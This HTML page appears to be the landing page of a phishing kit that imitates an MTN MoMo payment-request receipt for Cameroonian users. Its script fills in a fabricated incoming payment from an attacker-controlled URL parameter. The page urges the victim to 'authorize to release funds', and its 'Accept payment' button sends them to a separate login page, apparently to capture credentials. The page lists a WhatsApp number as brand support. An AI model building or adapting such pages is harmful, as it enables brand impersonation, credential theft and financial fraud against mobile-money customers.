<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo — Payment Request</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
:root{--mtn-yellow:#FFCC00;--mtn-yellow-dark:#F5B500;--mtn-blue:#0047AB;--mtn-blue-dark:#003380;--mtn-red:#E31B23;--bg-page:#f8fafc;--text-primary:#1f2937;--border-color:#e2e8f0;--shadow-card:0 4px 20px -2px rgba(0,0,0,.06);--font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--font-family);background:var(--bg-page);color:var(--text-primary);min-height:100vh;display:flex;flex-direction:column}

/* Brand */
.brand-badge{font-size:20px;font-weight:800;display:inline-flex;align-items:center;gap:2px}
.brand-mtn{color:var(--mtn-blue)}
.brand-momo{color:#003366}

/* Top bar */
.client-topbar{background:#fff;border-bottom:1px solid var(--border-color);padding:10px 20px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 1px 2px 0 rgba(0,0,0,.05)}
.client-brand{display:flex;align-items:center;font-size:18px;font-weight:800}
.mtn-logo-box{width:32px;height:32px;background:var(--mtn-yellow);border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:900;color:#003366;font-size:16px;margin-right:8px;box-shadow:0 2px 6px rgba(255,204,0,.4)}
.btn-client-help{background:#f8fafc;border:1px solid var(--border-color);border-radius:6px;padding:6px 12px;font-size:12px;font-weight:600;color:#475569;cursor:pointer}

/* Layout */
.client-main-container{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px 16px 40px}
.receipt-action-toolbar{display:flex;gap:10px;margin-bottom:16px}
.toolbar-btn{padding:8px 14px;background:#fff;border:1px solid #cbd5e1;border-radius:20px;font-size:12px;font-weight:600;color:#334155;cursor:pointer}
.toolbar-btn.primary{background:var(--mtn-blue);color:#fff;border-color:var(--mtn-blue)}

/* Receipt card */
.receipt-card-container{width:100%;max-width:440px;background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.08);overflow:hidden;display:flex;flex-direction:column;border:1px solid #e5e7eb}
.receipt-nav-header{display:flex;justify-content:space-between;align-items:center;padding:18px 20px 12px}
.receipt-header-title{font-size:16px;font-weight:700;color:#111827}
.btn-icon-back,.btn-icon-help{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#f9fafb;border:1px solid #f3f4f6;color:#4b5563;cursor:pointer}
.receipt-content-body{padding:8px 24px 24px;display:flex;flex-direction:column;align-items:center;text-align:center}

/* Status icon */
.success-circle-icon{width:52px;height:52px;border-radius:50%;background:var(--mtn-yellow);display:flex;align-items:center;justify-content:center;box-shadow:0 4px 14px rgba(255,204,0,.5);margin-bottom:12px}
.status-heading{font-size:19px;font-weight:800;color:#111827;margin-bottom:6px}
.status-description{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:12px;max-width:340px}
.status-time-row{display:inline-flex;align-items:center;gap:5px;font-size:12px;color:#6b7280;font-weight:500;margin-bottom:20px}

/* Amount + accept */
.amount-action-card{width:100%;background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:14px 16px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 6px rgba(0,0,0,.02)}
.amount-header-row{display:flex;flex-direction:column;align-items:flex-start;text-align:left}
.amount-label{font-size:12px;color:#6b7280;font-weight:500}
.amount-value{font-size:18px;font-weight:800;color:#111827}
.btn-accept-payment{background:var(--mtn-yellow);color:#000;border:none;border-radius:8px;padding:10px 18px;font-size:14px;font-weight:800;cursor:pointer;box-shadow:0 2px 8px rgba(255,204,0,.5);transition:all .15s}
.btn-accept-payment:hover{background:var(--mtn-yellow-dark);transform:translateY(-1px)}

/* Party rows */
.party-info-row{width:100%;display:flex;align-items:center;gap:14px;text-align:left;margin-bottom:14px}
.avatar-circle{width:44px;height:44px;border-radius:50%;background:#f3f4f6;color:#374151;font-size:14px;font-weight:700;display:flex;align-items:center;justify-content:center;border:1px solid #e5e7eb;flex-shrink:0}
.party-details{display:flex;flex-direction:column}
.party-name{font-size:15px;font-weight:700;color:#111827}
.party-subtext{font-size:13px;color:#6b7280}
.receipt-divider{width:100%;height:1px;background:#f1f5f9;margin:6px 0 16px}
.from-section{width:100%;text-align:left;margin-bottom:16px}
.section-label{display:block;font-size:12px;color:#9ca3af;font-weight:500;margin-bottom:10px}

/* Meta list */
.metadata-list{width:100%;display:flex;flex-direction:column;gap:12px;background:#f9fafb;border-radius:10px;padding:14px;margin-bottom:22px}
.metadata-row{display:flex;justify-content:space-between;align-items:center;font-size:13px}
.meta-label{color:#6b7280;font-weight:500}
.meta-value{color:#111827;font-weight:700}

/* MoMo logo */
.momo-logo-mark{font-size:24px;font-weight:900;padding:6px 0 2px;letter-spacing:-.5px}
.logo-mtn{color:var(--mtn-blue)}.logo-momo{color:#003366}

/* Modal */
.modal-backdrop{position:fixed;inset:0;background:rgba(15,23,42,.65);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:1000;padding:16px}
.modal-backdrop.open{display:flex;animation:fadeIn .2s ease-out}
@keyframes fadeIn{from{opacity:0;transform:scale(.98)}to{opacity:1;transform:scale(1)}}
.status-popup-card{background:#fff;border-radius:20px;max-width:420px;width:100%;padding:28px 22px;text-align:center}
.status-popup-title{font-size:18px;font-weight:800;color:#111827;margin-bottom:8px}
.status-popup-desc{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:18px}
.btn-popup-primary{background:var(--mtn-blue);color:#fff;border:none;border-radius:8px;padding:12px 20px;font-size:14px;font-weight:700;cursor:pointer;width:100%}

/* Toast */
.toast-notification{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#0f172a;color:#fff;padding:12px 20px;border-radius:8px;font-size:13px;font-weight:600;z-index:2000;opacity:0;transition:all .3s;pointer-events:none;max-width:90%;text-align:center}
.toast-notification.show{transform:translateX(-50%) translateY(0);opacity:1}
</style>
</head>
<body>

<header class="client-topbar">
  <div class="client-brand">
    <div class="mtn-logo-box">M</div>
    <span class="brand-mtn">MTN</span><span class="brand-momo">&nbsp;MoMo</span>
  </div>
  <button type="button" class="btn-client-help" onclick="openHelpModal()">Help</button>
</header>

<main class="client-main-container">
  <div class="receipt-action-toolbar">
    <button type="button" class="toolbar-btn" onclick="copyReceiptText()">Copy Receipt</button>
    <button type="button" class="toolbar-btn primary" onclick="printReceipt()">Print</button>
  </div>

  <div class="receipt-card-container">
    <div class="receipt-nav-header">
      <button type="button" class="btn-icon-back" onclick="openShareModal()">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
      </button>
      <span class="receipt-header-title">Payment Request</span>
      <button type="button" class="btn-icon-help" onclick="openHelpModal()">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
      </button>
    </div>

    <div class="receipt-content-body">
      <div class="success-circle-icon">
        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#003366" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <h2 class="status-heading">Payment Request Received</h2>
      <p class="status-description">A payment request has been sent to you. Review the details below and authorize to release funds.</p>
      <div class="status-time-row">
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
        <span id="receipt-timestamp"></span>
      </div>

      <div class="amount-action-card">
        <div class="amount-header-row">
          <span class="amount-label">Amount to pay</span>
          <span class="amount-value" id="display-amount"></span>
        </div>
        <button type="button" class="btn-accept-payment" onclick="handleAcceptPayment()">Accept payment</button>
      </div>

      <div class="party-info-row">
        <div class="avatar-circle" id="recipient-avatar"></div>
        <div class="party-details">
          <span class="party-name" id="display-account-name"></span>
          <span class="party-subtext" id="display-account-number"></span>
        </div>
      </div>

      <div class="receipt-divider"></div>

      <div class="from-section">
        <span class="section-label">From</span>
        <div class="party-info-row">
          <div class="avatar-circle" id="sender-avatar"></div>
          <div class="party-details">
            <span class="party-name" id="display-mode-payment"></span>
            <span class="party-subtext" id="display-service-name"></span>
          </div>
        </div>
      </div>

      <div class="metadata-list">
        <div class="metadata-row"><span class="meta-label">Country</span><span class="meta-value" id="display-country-name"></span></div>
        <div class="metadata-row"><span class="meta-label">Transaction ID</span><span class="meta-value" id="display-tracking-id"></span></div>
      </div>

      <div class="momo-logo-mark"><span class="logo-mtn">MTN</span><span class="logo-momo"> MoMo</span></div>
    </div>
  </div>
</main>

<!-- HELP MODAL -->
<div class="modal-backdrop" id="modal-help" onclick="closeModalOnBackdrop(event,'modal-help')">
  <div class="status-popup-card" style="text-align:left">
    <h3 class="status-popup-title" style="text-align:center;margin-bottom:16px">Help &amp; Support</h3>
    <div style="display:flex;flex-direction:column;gap:10px;background:#f8fafc;padding:14px;border-radius:8px;font-size:13px">
      <div style="display:flex;justify-content:space-between"><span>MTN MoMo Support</span><strong>*126#</strong></div>
      <div style="display:flex;justify-content:space-between"><span>WhatsApp</span><strong>+237 6 79 00 01 26</strong></div>
    </div>
    <button type="button" class="btn-popup-primary" style="margin-top:16px" onclick="closeModal('modal-help')">Close</button>
  </div>
</div>

<!-- SHARE MODAL -->
<div class="modal-backdrop" id="modal-share" onclick="closeModalOnBackdrop(event,'modal-share')">
  <div class="status-popup-card">
    <h3 class="status-popup-title" style="margin-bottom:14px">Share Receipt</h3>
    <input type="text" id="share-link-input" readonly style="width:100%;padding:10px;font-size:13px;font-family:monospace;border:1px solid #cbd5e1;border-radius:6px;margin-bottom:14px">
    <div style="display:flex;gap:8px">
      <button type="button" class="btn-popup-primary" onclick="copyShareInput()">Copy</button>
      <button type="button" class="btn-popup-primary" style="background:#f1f5f9;color:#334155" onclick="closeModal('modal-share')">Close</button>
    </div>
  </div>
</div>

<div id="toast" class="toast-notification"></div>

<script>
const SESSION_KEY = 'mtnmomo_current_receipt';
const LINK_KEY = 'mtnmomo_receipts_history';

let currentReceipt = {
  trackingNumber:'', modeOfPayment:'', accountName:'', countryCode:'+237', countryFlag:'🇨🇲',
  countryName:'Cameroon', accountNumber:'', amount:'', currency:'XAF', receiptOptional:'',
  timestamp:'', isAccepted:false
};

function init(){
  loadReceipt();
  renderReceipt();
}

function loadReceipt(){
  const params = new URLSearchParams(location.search);
  const p = params.get('p');
  const tracking = params.get('tracking');

  if (p) {
    try {
      const j = JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(p)))));
      currentReceipt = {
        trackingNumber: j.t || '',
        accountName: j.n || '',
        amount: j.a || '',
        currency: j.c || 'XAF',
        countryCode: j.cc || '+237',
        countryFlag: j.cf || '🇨🇲',
        countryName: j.cn || 'Cameroon',
        accountNumber: j.acc || '',
        modeOfPayment: j.m || '',
        receiptOptional: j.r || '',
        timestamp: j.ts || '',
        isAccepted: false
      };
    } catch(e){ console.error('Payload decode error:', e); }
  } else if (tracking) {
    currentReceipt.trackingNumber = tracking.toUpperCase();
  } else {
    const saved = sessionStorage.getItem(SESSION_KEY) || localStorage.getItem(LINK_KEY);
    if (saved) {
      try { currentReceipt = Object.assign(currentReceipt, JSON.parse(saved)); } catch(e){}
    }
  }
  sessionStorage.setItem(SESSION_KEY, JSON.stringify(currentReceipt));
}

function renderReceipt(){
  const cur = (currentReceipt.currency || '').toUpperCase();
  const amt = currentReceipt.amount ? `${cur} ${parseFloat(currentReceipt.amount).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})}`.trim() : '';

  document.getElementById('display-amount').textContent = amt;
  document.getElementById('display-account-name').textContent = currentReceipt.accountName || '';
  document.getElementById('display-account-number').textContent = currentReceipt.accountNumber || '';
  document.getElementById('display-mode-payment').textContent = currentReceipt.modeOfPayment || '';
  document.getElementById('display-service-name').textContent = currentReceipt.receiptOptional || '';
  document.getElementById('display-country-name').textContent =
    currentReceipt.countryName
      ? `${currentReceipt.countryFlag || ''} ${currentReceipt.countryName} (${currentReceipt.countryCode || ''})`.trim()
      : '';
  document.getElementById('display-tracking-id').textContent = currentReceipt.trackingNumber || '';

  document.getElementById('recipient-avatar').textContent =
    currentReceipt.accountName ? initials(currentReceipt.accountName) : '';
  document.getElementById('sender-avatar').textContent =
    currentReceipt.modeOfPayment ? initials(currentReceipt.modeOfPayment) : '';

  const t = document.getElementById('receipt-timestamp');
  if (currentReceipt.timestamp) {
    t.textContent = currentReceipt.timestamp;
  } else {
    const n = new Date();
    const m = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
    t.textContent = `${m[n.getMonth()]} ${n.getDate()} ${String(n.getHours()).padStart(2,'0')}:${String(n.getMinutes()).padStart(2,'0')}`;
  }
}

function initials(n){
  if(!n) return '';
  const p = n.trim().split(/\s+/);
  return p.length >= 2 ? (p[0][0]+p[1][0]).toUpperCase() : p[0].substring(0,2).toUpperCase();
}

function handleAcceptPayment(){
  // Persist receipt so the next pages can read it
  sessionStorage.setItem(SESSION_KEY, JSON.stringify(currentReceipt));
  window.location.href = 'login.html';
}

function openHelpModal(){ document.getElementById('modal-help').classList.add('open'); }
function openShareModal(){
  document.getElementById('share-link-input').value = location.href;
  document.getElementById('modal-share').classList.add('open');
}
function copyShareInput(){
  const i = document.getElementById('share-link-input');
  i.select(); i.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(i.value).then(() => toast('Link copied!'));
}
function copyReceiptText(){
  const t = `MTN MoMo Receipt\nAmount: ${currentReceipt.currency} ${currentReceipt.amount}\nRecipient: ${currentReceipt.accountName}\nTxID: ${currentReceipt.trackingNumber}`;
  navigator.clipboard.writeText(t).then(() => toast('Copied!'));
}
function printReceipt(){ window.print(); }
function closeModal(id){ document.getElementById(id).classList.remove('open'); }
function closeModalOnBackdrop(e, id){ if(e.target.id === id) closeModal(id); }

let toastT;
function toast(msg){
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.add('show');
  clearTimeout(toastT);
  toastT = setTimeout(() => t.classList.remove('show'), 3200);
}

document.addEventListener('DOMContentLoaded', init);
</script>
</body>
</html>
